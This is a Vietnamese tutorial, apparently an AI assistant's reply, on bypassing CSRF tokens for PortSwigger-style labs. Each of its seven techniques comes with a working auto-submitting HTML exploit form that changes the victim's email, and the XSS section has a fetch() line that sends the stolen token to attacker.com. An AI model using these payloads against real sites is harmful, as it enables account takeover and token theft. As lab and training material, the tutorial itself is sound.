Dưới đây là ví dụ đầy đủ (kịch bản + payload) cho từng kỹ thuật bypass CSRF token trong sơ đồ của bạn:

---

### 1. Xóa token (Remove token)
**Điều kiện:** Server có logic sai lầm: chỉ kiểm tra token **nếu** tham số đó tồn tại. Nếu bạn xóa hoàn toàn tham số `csrf` khỏi request, server sẽ bỏ qua bước kiểm tra.

**Payload (Exploit Server - Body):**
```html
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <!-- Không có input csrf ở đây -->
</form>
<script>document.forms[0].submit();</script>
```

---

### 2. Để trống token (Leave token empty)
**Điều kiện:** Server mong đợi tham số `csrf` phải có, nhưng logic so sánh bị lỗi (ví dụ: so sánh chuỗi rỗng với giá trị mặc định `null`/`undefined`).

**Payload (Exploit Server - Body):**
```html
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="">
</form>
<script>document.forms[0].submit();</script>
```

---

### 3. Dùng token cũ (Use old token)
**Điều kiện:** Token không được làm mới sau mỗi lần sử dụng, hoặc không bị vô hiệu hóa sau khi đăng xuất. Kẻ tấn công lấy một token hợp lệ từ phiên trước đó và tái sử dụng.

**Kịch bản:**
1. Kẻ tấn công đăng nhập, lấy token `abc123`.
2. Đăng xuất. Đăng nhập lại, token mới là `xyz789`. Nhưng server vẫn chấp nhận token `abc123` cũ.
3. Kẻ tấn công dùng token `abc123` này cho payload CSRF.

**Payload (Exploit Server - Body):**
```html
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="abc123">
</form>
<script>document.forms[0].submit();</script>
```

---

### 4. Token không gắn với session (Token not tied to session)
**Điều kiện:** Server tạo token nhưng không lưu nó vào session của người dùng cụ thể. Token chỉ được kiểm tra xem có tồn tại trong hệ thống hay không.

**Kịch bản:**
1. Kẻ tấn công đăng nhập vào tài khoản của chính mình, lấy token `hacker_token_123`.
2. Kẻ tấn công tạo payload CSRF chứa token này và gửi đến nạn nhân.
3. Nạn nhân submit form với cookie session của họ, nhưng token là của kẻ tấn công.
4. Server thấy token hợp lệ → thực hiện hành động.

**Payload (Exploit Server - Body):**
```html
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="hacker_token_123">
</form>
<script>document.forms[0].submit();</script>
```

---

### 5. Token yếu, đoán được (Weak token, predictable)
**Điều kiện:** Token được tạo bằng thuật toán dễ đoán như timestamp, ID người dùng, hoặc mã hóa yếu (Base64 của email).

**Kịch bản:**
Token chính là `base64(email)`. Nếu email nạn nhân là `victim@example.com`, token sẽ là `dmljdGltQGV4YW1wbGUuY29t`. Kẻ tấn công tự tính toán và điền vào payload.

**Payload (Exploit Server - Body):**
```html
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="dmljdGltQGV4YW1wbGUuY29t">
</form>
<script>document.forms[0].submit();</script>
```

---

### 6. Token leak qua Referer (Token leak via Referer)
**Điều kiện:** Token bị lộ trong URL (không phải trong body). Khi trang web tải tài nguyên bên ngoài (hình ảnh, script), header `Referer` sẽ chứa URL đầy đủ kèm token.

**Kịch bản:**
1. URL trang: `https://victim.com/change-email?csrf=SECRET_TOKEN`.
2. Trang này nhúng `<img src="https://attacker.com/log">`.
3. Khi trình duyệt tải ảnh, nó gửi `Referer: https://victim.com/change-email?csrf=SECRET_TOKEN` đến server của kẻ tấn công.
4. Kẻ tấn công đọc log, lấy token và dùng nó để thực hiện CSRF.

**Payload (Exploit Server - Body):**
```html
<!-- Sau khi đã lấy được token từ Referer log -->
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="SECRET_TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

---

### 7. Dùng XSS lấy token (Use XSS to get token)
**Điều kiện:** Trang web có lỗ hổng XSS. Kẻ tấn công có thể chạy JavaScript để đọc token từ DOM và gửi về server của mình.

**Payload (XSS - Inject vào trang web):**
```html
<script>
    fetch('https://attacker.com/steal?token=' + document.querySelector('input[name="csrf"]').value);
</script>
```

**Payload (Exploit Server - Body sau khi lấy được token):**
```html
<form action="https://victim.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="TOKEN_Lay_Duoc_Tu_XSS">
</form>
<script>document.forms[0].submit();</script>
```

---

Khi gặp lab có CSRF token, hãy thử ngay 3 bước đầu tiên: **Xóa token**, **Để trống token**, và **Đổi method POST sang GET**. Đây là những lỗi phổ biến nhất trong các lab "CSRF vulnerability with..." của PortSwigger.